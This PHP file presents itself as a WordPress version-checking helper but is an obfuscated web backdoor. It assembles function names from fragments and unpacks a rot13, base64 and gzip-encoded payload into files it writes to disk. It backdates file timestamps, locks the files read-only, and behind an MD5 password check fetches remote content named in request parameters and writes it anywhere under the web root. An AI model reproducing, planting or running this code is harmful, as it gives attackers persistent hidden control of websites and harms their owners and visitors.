<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y2kuozq1LJqypl9uMT1cov1gLJyhYH5nYaOi', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("cu{$check}ztn", 'ac6c89f07cab6b28f8b486cb8b97c4de')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}